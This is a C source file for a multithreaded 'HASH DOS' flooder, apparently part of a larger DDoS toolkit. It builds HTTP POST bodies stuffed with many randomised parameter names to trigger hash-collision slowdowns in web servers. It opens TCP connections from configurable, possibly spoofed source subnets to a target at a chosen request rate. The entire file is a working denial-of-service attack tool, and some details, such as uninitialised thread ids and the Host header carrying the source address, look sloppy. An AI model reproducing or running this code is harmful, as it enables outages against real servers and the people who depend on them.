#include "header.h"
#include "base/make_ipv4.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/hash_dos.h"
#include "base/make_tcp.h"

extern int g_num_threads;

// session counting
__u64 g_hash_dos_num_total;
__u64 g_hash_dos_num_generated_in_sec;
// from main()
InputArguments g_hash_dos_input;
__u32 g_hash_dos_request_per_sec;
// for masking next ip address
MaskingArguments g_hash_dos_now;
// thread
pthread_mutex_t g_hash_dos_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_hash_dos_cond;
// time checking
struct timespec g_hash_dos_before_time;
struct timespec g_hash_dos_now_time;

char hash_dos_content[1001];
char hash_dos_method[1300];

void hash_dos_print_usage(void)
{
	printf("HASH DOS Attack Usage : "
				 "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
	return;
}

void *generate_hash_dos(void *data)
{
	int thread_id = *((int *)data);
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_hash_dos_mutex);
		// get current resource
		get_masking_arguments(&g_hash_dos_input, &g_hash_dos_now);
		// time check
		time_check(
				&g_hash_dos_cond,
				&g_hash_dos_before_time,
				&g_hash_dos_now_time,
				&g_hash_dos_num_generated_in_sec);
		// wait a second
		if (g_hash_dos_num_generated_in_sec >= g_hash_dos_request_per_sec) {
			pthread_cond_wait(&g_hash_dos_cond, &g_hash_dos_mutex);
		}
		// make socket
		int src_port,seq,ack;
		int sock;

		sock =  tcp_make_connection(
				inet_addr(g_hash_dos_now.src),
				inet_addr(g_hash_dos_now.dest),
				&src_port,
				g_hash_dos_now.port,
				&seq,
				&ack,
				0);
		/*if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
			fprintf(stderr, "socket error %d %s\n", errno, strerror(errno));
			exit(1);
		}
		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(g_hash_dos_now.port);
		addr.sin_addr.s_addr = inet_addr(g_hash_dos_dest_ip);
		// tcp connection
		if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
			fprintf(stderr, "connect error %d %s\n", errno, strerror(errno));
			exit(1);
		}*/

		tcp_socket_send_data(
				sock,
				inet_addr(g_hash_dos_now.src),
				inet_addr(g_hash_dos_now.dest),
				src_port,
				g_hash_dos_now.port,
				hash_dos_method,
				strlen(hash_dos_method),
				seq,
				ack,
				0);
/*
		if (send(sock, hash_dos_method, strlen(hash_dos_method), 0) < 0) {
			fprintf(stderr, "send error %d %s\n", errno, strerror(errno));
			exit(1);
		}*/
		close(sock);
		g_hash_dos_num_generated_in_sec++;
		g_hash_dos_num_total++;
		pthread_mutex_unlock(&g_hash_dos_mutex);
	}
	return NULL;
}

void *hash_dos_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_hash_dos_mutex);
		time_check(
				&g_hash_dos_cond,
				&g_hash_dos_before_time,
				&g_hash_dos_now_time,
				&g_hash_dos_num_generated_in_sec);
		pthread_mutex_unlock(&g_hash_dos_mutex);
	}
	return NULL;
}

void hash_dos_main(char *argv[])
{
	// argument check


	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		hash_dos_print_usage();
		return;
	}
	argv_to_input_arguments(argv, &g_hash_dos_input);
	g_hash_dos_num_generated_in_sec = 0;
	g_hash_dos_num_total = 0;
	// prepare arbitary post method args
	srand(time(NULL));

	char arg[21] = "arrrarrarrarrAaAa=1&";
	int index = 0,j=0;
	for (int i = 0; i < 50; i++) {
		arg[13] = rand() % 26 + 'A';
		arg[14] = rand() % 26 + 'a';
		arg[15] = rand() % 26 + 'A';
		arg[16] = rand() % 26 + 'a';

		for(j=0;j<21;j++)
		{
			hash_dos_content[index+j] = arg[j];
		}
		index+=20;
	}
	hash_dos_content[index] = '\0';

	sprintf(hash_dos_method,
		"POST / HTTP/1.1\r\nHost: %s\r\n"
		"User-Agent: python-requests/2.22.0\r\n"
		"Accept-Encoding: gzip, deflate\r\n"
		"Accept: */*\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/x-www-form-urlencoded\r\n"
		"Content-Length: %d\r\n\r\n",
		g_hash_dos_input.src,
		(int) sizeof(hash_dos_content));
	sprintf(hash_dos_method + strlen(hash_dos_method), "%s\r\n", hash_dos_content);
	memset(&g_hash_dos_before_time, 0, sizeof(struct timespec));
	memset(&g_hash_dos_now_time, 0, sizeof(struct timespec));

	g_hash_dos_request_per_sec = atoi(argv[3]);
	const int num_threads = g_num_threads;
	pthread_t threads[9999];
	int thread_ids[9999];

	printf("Sending hash_dos requests to %s per %d\n",
			g_hash_dos_input.dest, g_hash_dos_request_per_sec);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(
				&threads[i],
				NULL,
				generate_hash_dos,
				(void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, hash_dos_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		printf("called\n");
		pthread_join(threads[i], NULL);
		printf("thread %d joined\n", i);
	}
	pthread_mutex_destroy(&g_hash_dos_mutex);
	printf("hash_dos flood Finished\nTotal %ld packets sent.\n",
			g_hash_dos_num_total);
	pthread_exit(NULL);
	return;
}
